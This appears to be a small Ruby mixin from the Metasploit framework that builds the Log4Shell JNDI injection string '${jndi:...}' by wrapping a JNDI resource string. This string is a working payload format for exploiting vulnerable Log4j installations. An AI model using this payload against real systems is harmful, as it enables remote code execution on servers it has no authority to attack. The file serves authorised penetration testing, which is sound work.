# -*- coding: binary -*-

module Msf
module Exploit::Remote::Log4Shell
  include Exploit::Remote::JndiInjection

  def log4j_jndi_string(resource = nil)
    "${jndi:#{jndi_string(resource)}}"
  end
end
end
